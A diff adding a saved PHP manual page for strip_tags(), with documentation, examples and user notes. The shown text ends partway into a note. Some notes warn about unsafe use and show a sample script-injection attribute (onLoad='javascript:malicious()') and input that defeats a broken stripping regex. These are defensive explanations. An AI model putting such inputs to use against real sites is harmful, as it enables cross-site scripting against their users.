@@ -1,0 +1,1156 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PHP: strip_tags - Manual </title>
+<link rel="shortcut icon" href="http://php.net/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="http://php.net/phpnetimprovedsearch.src" title="Add PHP.net search" />
+<link rel="alternate" type="application/atom+xml" href="http://php.net/releases/feed.php" title="PHP Release feed" />
+<link rel="alternate" type="application/atom+xml" href="http://php.net/feed.atom" title="PHP: Hypertext Preprocessor" />
+<link rel="canonical" href="http://php.net/manual/en/function.strip-tags.php" />
+<link rel="shorturl" href="http://php.net/strip-tags" />
+<link rel="alternate" href="http://php.net/strip-tags" hreflang="x-default" />
+<link rel="contents" href="http://php.net/manual/en/index.php" />
+<link rel="index" href="http://php.net/manual/en/ref.strings.php" />
+<link rel="prev" href="http://php.net/manual/en/function.strcspn.php" />
+<link rel="next" href="http://php.net/manual/en/function.stripcslashes.php" />
+<link rel="alternate" href="http://php.net/manual/en/function.strip-tags.php" hreflang="en" />
+<link rel="alternate" href="http://php.net/manual/pt_BR/function.strip-tags.php" hreflang="pt_BR" />
+<link rel="alternate" href="http://php.net/manual/zh/function.strip-tags.php" hreflang="zh" />
+<link rel="alternate" href="http://php.net/manual/fr/function.strip-tags.php" hreflang="fr" />
+<link rel="alternate" href="http://php.net/manual/de/function.strip-tags.php" hreflang="de" />
+<link rel="alternate" href="http://php.net/manual/ja/function.strip-tags.php" hreflang="ja" />
+<link rel="alternate" href="http://php.net/manual/kr/function.strip-tags.php" hreflang="kr" />
+<link rel="alternate" href="http://php.net/manual/ro/function.strip-tags.php" hreflang="ro" />
+<link rel="alternate" href="http://php.net/manual/ru/function.strip-tags.php" hreflang="ru" />
+<link rel="alternate" href="http://php.net/manual/es/function.strip-tags.php" hreflang="es" />
+<link rel="alternate" href="http://php.net/manual/tr/function.strip-tags.php" hreflang="tr" />
+<link rel="stylesheet" type="text/css" href="http://php.net/cached.php?t=1421837618&amp;f=/fonts/Fira/fira.css" media="screen" />
+<link rel="stylesheet" type="text/css" href="http://php.net/cached.php?t=1421837618&amp;f=/fonts/Font-Awesome/css/fontello.css" media="screen" />
+<link rel="stylesheet" type="text/css" href="http://php.net/cached.php?t=1429291204&amp;f=/styles/theme-base.css" media="screen" />
+<link rel="stylesheet" type="text/css" href="http://php.net/cached.php?t=1449787206&amp;f=/styles/theme-medium.css" media="screen" />
+<!--[if lte IE 7]&gt;
+ &lt;link rel="stylesheet" type="text/css" href="http://php.net/styles/workarounds.ie7.css" media="screen"&gt;
+ &lt;![endif]-->
+<!--[if lte IE 8]&gt;
+ &lt;script type="text/javascript"&gt;
+  window.brokenIE = true;
+ &lt;/script&gt;
+ &lt;![endif]-->
+<!--[if lte IE 9]&gt;
+ &lt;link rel="stylesheet" type="text/css" href="http://php.net/styles/workarounds.ie9.css" media="screen"&gt;
+ &lt;![endif]-->
+<!--[if IE]&gt;
+ &lt;script type="text/javascript" src="http://php.net/js/ext/html5.js"&gt;&lt;/script&gt;
+ &lt;![endif]-->
+<base href="http://php.net/manual/en/function.strip-tags.php" />
+</head>
+<body class="docs ">
+<nav id="head-nav" class="navbar navbar-fixed-top">
+<div class="navbar-inner clearfix">
+<a href="http://php.net/" class="brand"><img src="/images/logo.php" width="48" height="24" alt="php" /></a>
+<div id="mainmenu-toggle-overlay"></div>
+<input type="checkbox" id="mainmenu-toggle" />
+<ul class="nav">
+<li class=""><a href="http://php.net/downloads">Downloads</a></li>
+<li class="active"><a href="http://php.net/docs.php">Documentation</a></li>
+<li class=""><a href="http://php.net/get-involved">Get Involved</a></li>
+<li class=""><a href="http://php.net/support">Help</a></li>
+</ul>
+<form class="navbar-search" id="topsearch" action="/search.php">
+<input type="hidden" name="show" value="quickref" />
+<input type="search" name="pattern" class="search-query" placeholder="Search" accesskey="s" />
+</form>
+</div>
+<div id="flash-message"></div>
+</nav>
+<div class="headsup"><a href="http://php.net/conferences/index.php#id2016-01-30-1">NortheastPHP Conference CfP Opens</a></div>
+<nav id="trick"><div><dl>
+<dt><a href="http://php.net/manual/en/getting-started.php">Getting Started</a></dt>
+<dd><a href="http://php.net/manual/en/introduction.php">Introduction</a></dd>
+<dd><a href="http://php.net/manual/en/tutorial.php">A simple tutorial</a></dd>
+<dt><a href="http://php.net/manual/en/langref.php">Language Reference</a></dt>
+<dd><a href="http://php.net/manual/en/language.basic-syntax.php">Basic syntax</a></dd>
+<dd><a href="http://php.net/manual/en/language.types.php">Types</a></dd>
+<dd><a href="http://php.net/manual/en/language.variables.php">Variables</a></dd>
+<dd><a href="http://php.net/manual/en/language.constants.php">Constants</a></dd>
+<dd><a href="http://php.net/manual/en/language.expressions.php">Expressions</a></dd>
+<dd><a href="http://php.net/manual/en/language.operators.php">Operators</a></dd>
+<dd><a href="http://php.net/manual/en/language.control-structures.php">Control Structures</a></dd>
+<dd><a href="http://php.net/manual/en/language.functions.php">Functions</a></dd>
+<dd><a href="http://php.net/manual/en/language.oop5.php">Classes and Objects</a></dd>
+<dd><a href="http://php.net/manual/en/language.namespaces.php">Namespaces</a></dd>
+<dd><a href="http://php.net/manual/en/language.errors.php">Errors</a></dd>
+<dd><a href="http://php.net/manual/en/language.exceptions.php">Exceptions</a></dd>
+<dd><a href="http://php.net/manual/en/language.generators.php">Generators</a></dd>
+<dd><a href="http://php.net/manual/en/language.references.php">References Explained</a></dd>
+<dd><a href="http://php.net/manual/en/reserved.variables.php">Predefined Variables</a></dd>
+<dd><a href="http://php.net/manual/en/reserved.exceptions.php">Predefined Exceptions</a></dd>
+<dd><a href="http://php.net/manual/en/reserved.interfaces.php">Predefined Interfaces and Classes</a></dd>
+<dd><a href="http://php.net/manual/en/context.php">Context options and parameters</a></dd>
+<dd><a href="http://php.net/manual/en/wrappers.php">Supported Protocols and Wrappers</a></dd>
+</dl>
+<dl>
+<dt><a href="http://php.net/manual/en/security.php">Security</a></dt>
+<dd><a href="http://php.net/manual/en/security.intro.php">Introduction</a></dd>
+<dd><a href="http://php.net/manual/en/security.general.php">General considerations</a></dd>
+<dd><a href="http://php.net/manual/en/security.cgi-bin.php">Installed as CGI binary</a></dd>
+<dd><a href="http://php.net/manual/en/security.apache.php">Installed as an Apache module</a></dd>
+<dd><a href="http://php.net/manual/en/security.filesystem.php">Filesystem Security</a></dd>
+<dd><a href="http://php.net/manual/en/security.database.php">Database Security</a></dd>
+<dd><a href="http://php.net/manual/en/security.errors.php">Error Reporting</a></dd>
+<dd><a href="http://php.net/manual/en/security.globals.php">Using Register Globals</a></dd>
+<dd><a href="http://php.net/manual/en/security.variables.php">User Submitted Data</a></dd>
+<dd><a href="http://php.net/manual/en/security.magicquotes.php">Magic Quotes</a></dd>
+<dd><a href="http://php.net/manual/en/security.hiding.php">Hiding PHP</a></dd>
+<dd><a href="http://php.net/manual/en/security.current.php">Keeping Current</a></dd>
+<dt><a href="http://php.net/manual/en/features.php">Features</a></dt>
+<dd><a href="http://php.net/manual/en/features.http-auth.php">HTTP authentication with PHP</a></dd>
+<dd><a href="http://php.net/manual/en/features.cookies.php">Cookies</a></dd>
+<dd><a href="http://php.net/manual/en/features.sessions.php">Sessions</a></dd>
+<dd><a href="http://php.net/manual/en/features.xforms.php">Dealing with XForms</a></dd>
+<dd><a href="http://php.net/manual/en/features.file-upload.php">Handling file uploads</a></dd>
+<dd><a href="http://php.net/manual/en/features.remote-files.php">Using remote files</a></dd>
+<dd><a href="http://php.net/manual/en/features.connection-handling.php">Connection handling</a></dd>
+<dd><a href="http://php.net/manual/en/features.persistent-connections.php">Persistent Database Connections</a></dd>
+<dd><a href="http://php.net/manual/en/features.safe-mode.php">Safe Mode</a></dd>
+<dd><a href="http://php.net/manual/en/features.commandline.php">Command line usage</a></dd>
+<dd><a href="http://php.net/manual/en/features.gc.php">Garbage Collection</a></dd>
+<dd><a href="http://php.net/manual/en/features.dtrace.php">DTrace Dynamic Tracing</a></dd>
+</dl>
+<dl>
+<dt><a href="http://php.net/manual/en/funcref.php">Function Reference</a></dt>
+<dd><a href="http://php.net/manual/en/refs.basic.php.php">Affecting PHP's Behaviour</a></dd>
+<dd><a href="http://php.net/manual/en/refs.utilspec.audio.php">Audio Formats Manipulation</a></dd>
+<dd><a href="http://php.net/manual/en/refs.remote.auth.php">Authentication Services</a></dd>
+<dd><a href="http://php.net/manual/en/refs.utilspec.cmdline.php">Command Line Specific Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.compression.php">Compression and Archive Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.creditcard.php">Credit Card Processing</a></dd>
+<dd><a href="http://php.net/manual/en/refs.crypto.php">Cryptography Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.database.php">Database Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.calendar.php">Date and Time Related Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.fileprocess.file.php">File System Related Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.international.php">Human Language and Character Encoding Support</a></dd>
+<dd><a href="http://php.net/manual/en/refs.utilspec.image.php">Image Processing and Generation</a></dd>
+<dd><a href="http://php.net/manual/en/refs.remote.mail.php">Mail Related Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.math.php">Mathematical Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.utilspec.nontext.php">Non-Text MIME Output</a></dd>
+<dd><a href="http://php.net/manual/en/refs.fileprocess.process.php">Process Control Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.basic.other.php">Other Basic Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.remote.other.php">Other Services</a></dd>
+<dd><a href="http://php.net/manual/en/refs.search.php">Search Engine Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.utilspec.server.php">Server Specific Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.basic.session.php">Session Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.basic.text.php">Text Processing</a></dd>
+<dd><a href="http://php.net/manual/en/refs.basic.vartype.php">Variable and Type Related Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.webservice.php">Web Services</a></dd>
+<dd><a href="http://php.net/manual/en/refs.utilspec.windows.php">Windows Only Extensions</a></dd>
+<dd><a href="http://php.net/manual/en/refs.xml.php">XML Manipulation</a></dd>
+</dl>
+<dl>
+<dt>Keyboard Shortcuts</dt><dt>?</dt>
+<dd>This help</dd>
+<dt>j</dt>
+<dd>Next menu item</dd>
+<dt>k</dt>
+<dd>Previous menu item</dd>
+<dt>g p</dt>
+<dd>Previous man page</dd>
+<dt>g n</dt>
+<dd>Next man page</dd>
+<dt>G</dt>
+<dd>Scroll to bottom</dd>
+<dt>g g</dt>
+<dd>Scroll to top</dd>
+<dt>g h</dt>
+<dd>Goto homepage</dd>
+<dt>g s</dt>
+<dd>Goto search<br />(current page)</dd>
+<dt>/</dt>
+<dd>Focus search box</dd>
+</dl></div></nav>
+<div id="goto">
+<div class="search">
+<div class="text"></div>
+<div class="results"><ul></ul></div>
+</div>
+</div>
+<div id="breadcrumbs" class="clearfix">
+<div id="breadcrumbs-inner">
+<div class="next">
+<a href="function.stripcslashes.php">
+          stripcslashes &raquo;
+        </a>
+</div>
+<div class="prev">
+<a href="function.strcspn.php">
+          &laquo; strcspn        </a>
+</div>
+<ul>
+<li><a href="index.php">PHP Manual</a></li> <li><a href="funcref.php">Function Reference</a></li> <li><a href="refs.basic.text.php">Text Processing</a></li> <li><a href="book.strings.php">Strings</a></li> <li><a href="ref.strings.php">String Functions</a></li> </ul>
+</div>
+</div>
+<div id="layout" class="clearfix">
+<section id="layout-content">
+<div class="page-tools">
+<div class="change-language">
+<form action="/manual/change.php" method="get" id="changelang" name="changelang">
+<fieldset>
+<label for="changelang-langs">Change language:</label>
+<select onchange="document.changelang.submit()" name="page" id="changelang-langs">
+<option value="en/function.strip-tags.php" selected="selected">English</option>
+<option value="pt_BR/function.strip-tags.php">Brazilian Portuguese</option>
+<option value="zh/function.strip-tags.php">Chinese (Simplified)</option>
+<option value="fr/function.strip-tags.php">French</option>
+<option value="de/function.strip-tags.php">German</option>
+<option value="ja/function.strip-tags.php">Japanese</option>
+<option value="kr/function.strip-tags.php">Korean</option>
+<option value="ro/function.strip-tags.php">Romanian</option>
+<option value="ru/function.strip-tags.php">Russian</option>
+<option value="es/function.strip-tags.php">Spanish</option>
+<option value="tr/function.strip-tags.php">Turkish</option>
+<option value="help-translate.php">Other</option>
+</select>
+</fieldset>
+</form>
+</div>
+<div class="edit-bug">
+<a href="https://edit.php.net/?project=PHP&amp;perm=en/function.strip-tags.php">Edit</a>
+<a href="https://bugs.php.net/report.php?bug_type=Documentation+problem&amp;manpage=function.strip-tags">Report a Bug</a>
+</div>
+</div><div id="function.strip-tags" class="refentry">
+<div class="refnamediv">
+<h1 class="refname">strip_tags</h1>
+<p class="verinfo">(PHP 4, PHP 5, PHP 7)</p><p class="refpurpose"><span class="refname">strip_tags</span> &mdash; <span class="dc-title">Strip HTML and PHP tags from a string</span></p>
+</div>
+<div class="refsect1 description" id="refsect1-function.strip-tags-description">
+<h3 class="title">Description</h3>
+<div class="methodsynopsis dc-description">
+<span class="type">string</span> <span class="methodname"><strong>strip_tags</strong></span>
+    ( <span class="methodparam"><span class="type">string</span> <code class="parameter">$str</code></span>
+   [, <span class="methodparam"><span class="type">string</span> <code class="parameter">$allowable_tags</code></span>
+  ] )</div>
+<p class="para rdfs-comment">
+   This function tries to return a string with all NULL bytes, HTML and PHP tags stripped
+   from a given <code class="parameter">str</code>.  It uses the same tag stripping
+   state machine as the <span class="function"><a href="function.fgetss.php" class="function">fgetss()</a></span> function.
+  </p>
+</div>
+<div class="refsect1 parameters" id="refsect1-function.strip-tags-parameters">
+<h3 class="title">Parameters</h3>
+<p class="para">
+<dl>
+<dt>
+<code class="parameter">str</code></dt>
+<dd>
+<p class="para">
+       The input string.
+      </p>
+</dd>
+<dt>
+<code class="parameter">allowable_tags</code></dt>
+<dd>
+<p class="para">
+       You can use the optional second parameter to specify tags which should
+       not be stripped.
+      </p>
+<blockquote class="note"><p><strong class="note">Note</strong>: 
+       </p><p class="para">
+        HTML comments and PHP tags are also stripped. This is hardcoded and
+        can not be changed with <code class="parameter">allowable_tags</code>.
+       </p>
+</blockquote></dd></dl></p>
+<blockquote class="note"><p><strong class="note">Note</strong>: 
+       </p><p class="para">
+        In PHP 5.3.4 and later, self-closing
+        XHTML tags are ignored and only non-self-closing tags should be used in
+        <code class="parameter">str</code>. For example,
+        to allow both <em>&lt;br&gt;</em> and
+        <em>&lt;br/&gt;</em>, you should use:
+       </p>
+<div class="informalexample">
+<div class="example-contents">
+<div class="phpcode"><code><span style="color: #000000">
+<span style="color: #0000BB">&lt;?php<br />strip_tags</span><span style="color: #007700">(</span><span style="color: #0000BB">$input</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'&lt;br&gt;'</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">?&gt;</span>
+</span>
+</code></div>
+</div>
+</div>
+</blockquote>
+
+
+
+</div>
+<div class="refsect1 returnvalues" id="refsect1-function.strip-tags-returnvalues">
+<h3 class="title">Return Values</h3>
+<p class="para">
+   Returns the stripped string.
+  </p>
+</div>
+<div class="refsect1 changelog" id="refsect1-function.strip-tags-changelog">
+<h3 class="title">Changelog</h3>
+<p class="para">
+<table class="doctable informaltable">
+<thead>
+<tr>
+<th>Version</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody class="tbody">
+<tr>
+<td>5.3.4</td>
+<td>
+<span class="function"><strong>strip_tags()</strong></span> ignores self-closing XHTML
+        tags in
+        <code class="parameter">allowable_tags</code>.
+       </td>
+</tr>
+<tr>
+<td>5.0.0</td>
+<td>
+<span class="function"><strong>strip_tags()</strong></span> is now binary safe.
+       </td>
+</tr>
+</tbody>
+</table>
+</p>
+</div>
+<div class="refsect1 examples" id="refsect1-function.strip-tags-examples">
+<h3 class="title">Examples</h3>
+<p class="para">
+<div class="example" id="example-5446">
+<p><strong>Example #1 <span class="function"></span></strong><strong>strip_tags()</strong> example</p>
+<div class="example-contents">
+<div class="phpcode"><code><span style="color: #000000">
+<span style="color: #0000BB">&lt;?php<br />$text&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'&lt;p&gt;Test&nbsp;paragraph.&lt;/p&gt;&lt;!--&nbsp;Comment&nbsp;--&gt;&nbsp;&lt;a&nbsp;href="#fragment"&gt;Other&nbsp;text&lt;/a&gt;'</span><span style="color: #007700">;<br />echo&nbsp;</span><span style="color: #0000BB">strip_tags</span><span style="color: #007700">(</span><span style="color: #0000BB">$text</span><span style="color: #007700">);<br />echo&nbsp;</span><span style="color: #DD0000">"\n"</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">//&nbsp;Allow&nbsp;&lt;p&gt;&nbsp;and&nbsp;&lt;a&gt;<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #0000BB">strip_tags</span><span style="color: #007700">(</span><span style="color: #0000BB">$text</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'&lt;p&gt;&lt;a&gt;'</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">?&gt;</span>
+</span>
+</code></div>
+</div>
+<div class="example-contents"><p>The above example will output:</p></div>
+<div class="example-contents screen">
+<div class="cdata"><pre>
+Test paragraph. Other text
+&lt;p&gt;Test paragraph.&lt;/p&gt; &lt;a href=&quot;#fragment&quot;&gt;Other text&lt;/a&gt;
+</pre></div>
+</div>
+</div>
+</p>
+</div>
+<div class="refsect1 notes" id="refsect1-function.strip-tags-notes">
+<h3 class="title">Notes</h3>
+<div class="warning"><strong class="warning">Warning</strong>
+<p class="para">
+    Because <span class="function"><strong>strip_tags()</strong></span> does not actually validate the
+    HTML, partial or broken tags can result in the removal of more
+    text/data than expected.
+   </p>
+</div>
+<div class="warning"><strong class="warning">Warning</strong>
+<p class="para">
+    This function does not modify any attributes on the tags that you allow
+    using <code class="parameter">allowable_tags</code>, including the
+    <em>style</em> and <em>onmouseover</em> attributes
+    that a mischievous user may abuse when posting text that will be shown
+    to other users.
+   </p>
+</div>
+<blockquote class="note"><p><strong class="note">Note</strong>: 
+   </p><p class="para">
+    Tag names within the input HTML that are greater than 1023 bytes in length
+    will be treated as though they are invalid, regardless of the
+    <code class="parameter">allowable_tags</code> parameter.
+   </p>
+</blockquote>
+</div>
+<div class="refsect1 seealso" id="refsect1-function.strip-tags-seealso">
+<h3 class="title">See Also</h3>
+<p class="para">
+<ul class="simplelist">
+<li class="member"><span class="function"><a href="function.htmlspecialchars.php" class="function" rel="rdfs-seeAlso">htmlspecialchars()</a> - Convert special characters to HTML entities</span></li>
+</ul>
+</p>
+</div>
+</div>
+</section><section id="usernotes">
+<div class="head">
+<span class="action"><a href="http://php.net/manual/add-note.php?sect=function.strip-tags&amp;redirect=http://php.net/manual/en/function.strip-tags.php"><img src="/images/notes-add@2x.png" alt="add a note" width="12" height="12" /> <small>add a note</small></a></span>
+<h3 class="title">User Contributed Notes <span class="count">23 notes</span></h3>
+</div><div id="allnotes">
+<div class="note" id="114909"> <div class="votes">
+<div id="Vu114909">
+<a href="http://php.net/manual/vote-note.php?id=114909&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd114909">
+<a href="http://php.net/manual/vote-note.php?id=114909&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V114909" title="71% like this...">
+    87
+    </div>
+</div>
+<a href="#114909" class="name">
+<strong class="user"><em>Kenji</em></strong></a><a class="genanchor" href="#114909"> &para;</a><div class="date" title="2014-04-24 02:11"><strong>1 year ago</strong></div>
+<div class="text" id="Hcom114909">
+<div class="phpcode"><code><span class="html">
+A word of warning!!<br />Do NOT use "admin at automapit dot com"s regex. It's broken:<br /><br />"lalala &lt;b&lt;b&gt;&gt; lala &lt;/b&lt;b&gt;&gt;"<br /><br />will be stripped into<br /><br />"lalala &lt;b&gt; lala &lt;/b&gt;"<br /><br />I CANNOT overstate the severity of the security issues you are introducing with such a code! Don't use it, stay safe.</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="86964"> <div class="votes">
+<div id="Vu86964">
+<a href="http://php.net/manual/vote-note.php?id=86964&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd86964">
+<a href="http://php.net/manual/vote-note.php?id=86964&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V86964" title="69% like this...">
+    46
+    </div>
+</div>
+<a href="#86964" class="name">
+<strong class="user"><em>mariusz.tarnaski at wp dot pl</em></strong></a><a class="genanchor" href="#86964"> &para;</a><div class="date" title="2008-11-12 08:05"><strong>7 years ago</strong></div>
+<div class="text" id="Hcom86964">
+<div class="phpcode"><code><span class="html">
+Hi. I made a function that removes the HTML tags along with their contents:<br /> <br />Function:<br /><span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">strip_tags_content</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="default">$tags </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">, </span><span class="default">$invert </span><span class="keyword">= </span><span class="default">FALSE</span><span class="keyword">) {<br /> <br />&nbsp; </span><span class="default">preg_match_all</span><span class="keyword">(</span><span class="string">'/&lt;(.+?)[\s]*\/?[\s]*&gt;/si'</span><span class="keyword">, </span><span class="default">trim</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">), </span><span class="default">$tags</span><span class="keyword">);<br />&nbsp; </span><span class="default">$tags </span><span class="keyword">= </span><span class="default">array_unique</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />&nbsp; &nbsp; <br />&nbsp; if(</span><span class="default">is_array</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">) AND </span><span class="default">count</span><span class="keyword">(</span><span class="default">$tags</span><span class="keyword">) &gt; </span><span class="default">0</span><span class="keyword">) {<br />&nbsp; &nbsp; if(</span><span class="default">$invert </span><span class="keyword">== </span><span class="default">FALSE</span><span class="keyword">) {<br />&nbsp; &nbsp; &nbsp; return </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'@&lt;(?!(?:'</span><span class="keyword">. </span><span class="default">implode</span><span class="keyword">(</span><span class="string">'|'</span><span class="keyword">, </span><span class="default">$tags</span><span class="keyword">) .</span><span class="string">')\b)(\w+)\b.*?&gt;.*?&lt;/\1&gt;@si'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);<br />&nbsp; &nbsp; }<br />&nbsp; &nbsp; else {<br />&nbsp; &nbsp; &nbsp; return </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'@&lt;('</span><span class="keyword">. </span><span class="default">implode</span><span class="keyword">(</span><span class="string">'|'</span><span class="keyword">, </span><span class="default">$tags</span><span class="keyword">) .</span><span class="string">')\b.*?&gt;.*?&lt;/\1&gt;@si'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);<br />&nbsp; &nbsp; }<br />&nbsp; }<br />&nbsp; elseif(</span><span class="default">$invert </span><span class="keyword">== </span><span class="default">FALSE</span><span class="keyword">) {<br />&nbsp; &nbsp; return </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'@&lt;(\w+)\b.*?&gt;.*?&lt;/\1&gt;@si'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);<br />&nbsp; }<br />&nbsp; return </span><span class="default">$text</span><span class="keyword">;<br />}<br /></span><span class="default">?&gt;<br /></span> <br />Sample text:<br />$text = '&lt;b&gt;sample&lt;/b&gt; text with &lt;div&gt;tags&lt;/div&gt;';<br /> <br />Result for strip_tags($text):<br />sample text with tags<br /> <br />Result for strip_tags_content($text):<br /> text with <br /> <br />Result for strip_tags_content($text, '&lt;b&gt;'):<br />&lt;b&gt;sample&lt;/b&gt; text with <br /> <br />Result for strip_tags_content($text, '&lt;b&gt;', TRUE);<br /> text with &lt;div&gt;tags&lt;/div&gt;<br /> <br />I hope that someone is useful :)</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="88991"> <div class="votes">
+<div id="Vu88991">
+<a href="http://php.net/manual/vote-note.php?id=88991&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd88991">
+<a href="http://php.net/manual/vote-note.php?id=88991&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V88991" title="65% like this...">
+    32
+    </div>
+</div>
+<a href="#88991" class="name">
+<strong class="user"><em>CEO at CarPool2Camp dot org</em></strong></a><a class="genanchor" href="#88991"> &para;</a><div class="date" title="2009-02-17 11:10"><strong>6 years ago</strong></div>
+<div class="text" id="Hcom88991">
+<div class="phpcode"><code><span class="html">
+Note the different outputs from different versions of the same tag:<br /> <br /><span class="default">&lt;?php </span><span class="comment">// striptags.php<br /></span><span class="default">$data </span><span class="keyword">= </span><span class="string">'&lt;br&gt;Each&lt;br/&gt;New&lt;br /&gt;Line'</span><span class="keyword">;<br /></span><span class="default">$new&nbsp; </span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$data</span><span class="keyword">, </span><span class="string">'&lt;br&gt;'</span><span class="keyword">);<br /></span><span class="default">var_dump</span><span class="keyword">(</span><span class="default">$new</span><span class="keyword">);&nbsp; </span><span class="comment">// OUTPUTS string(21) "&lt;br&gt;EachNew&lt;br /&gt;Line"<br /> <br /></span><span class="keyword">&lt;?</span><span class="default">php </span><span class="comment">// striptags.php<br /></span><span class="default">$data </span><span class="keyword">= </span><span class="string">'&lt;br&gt;Each&lt;br/&gt;New&lt;br /&gt;Line'</span><span class="keyword">;<br /></span><span class="default">$new&nbsp; </span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$data</span><span class="keyword">, </span><span class="string">'&lt;br/&gt;'</span><span class="keyword">);<br /></span><span class="default">var_dump</span><span class="keyword">(</span><span class="default">$new</span><span class="keyword">); </span><span class="comment">// OUTPUTS string(16) "Each&lt;br/&gt;NewLine"<br /> <br /></span><span class="keyword">&lt;?</span><span class="default">php </span><span class="comment">// striptags.php<br /></span><span class="default">$data </span><span class="keyword">= </span><span class="string">'&lt;br&gt;Each&lt;br/&gt;New&lt;br /&gt;Line'</span><span class="keyword">;<br /></span><span class="default">$new&nbsp; </span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$data</span><span class="keyword">, </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">);<br /></span><span class="default">var_dump</span><span class="keyword">(</span><span class="default">$new</span><span class="keyword">); </span><span class="comment">// OUTPUTS string(11) "EachNewLine"<br /></span><span class="default">?&gt;</span>
+</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="118183"> <div class="votes">
+<div id="Vu118183">
+<a href="http://php.net/manual/vote-note.php?id=118183&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd118183">
+<a href="http://php.net/manual/vote-note.php?id=118183&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V118183" title="66% like this...">
+    1
+    </div>
+</div>
+<a href="#118183" class="name">
+<strong class="user"><em>Dr. Gianluigi &amp;#34;Zane&amp;#34; Zanettini</em></strong></a><a class="genanchor" href="#118183"> &para;</a><div class="date" title="2015-10-22 07:52"><strong>3 months ago</strong></div>
+<div class="text" id="Hcom118183">
+<div class="phpcode"><code><span class="html">
+A word of caution. strip_tags() can actually be used for input validation as long as you remove ANY tag. As soon as you accept a single tag (2nd parameter), you are opening up a security hole such as this:<br /><br />&lt;acceptedTag onLoad="javascript:malicious()" /&gt;<br /><br />Plus: regexing away attributes or code block is really not the right solution. For effective input validation when using strip_tags() with even a single tag accepted, <a href="http://htmlpurifier.org/" rel="nofollow" target="_blank">http://htmlpurifier.org/</a> is the way to go.</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="110280"> <div class="votes">
+<div id="Vu110280">
+<a href="http://php.net/manual/vote-note.php?id=110280&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd110280">
+<a href="http://php.net/manual/vote-note.php?id=110280&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V110280" title="62% like this...">
+    18
+    </div>
+</div>
+<a href="#110280" class="name">
+<strong class="user"><em>bzplan at web dot de</em></strong></a><a class="genanchor" href="#110280"> &para;</a><div class="date" title="2012-10-07 07:57"><strong>3 years ago</strong></div>
+<div class="text" id="Hcom110280">
+<div class="phpcode"><code><span class="html">
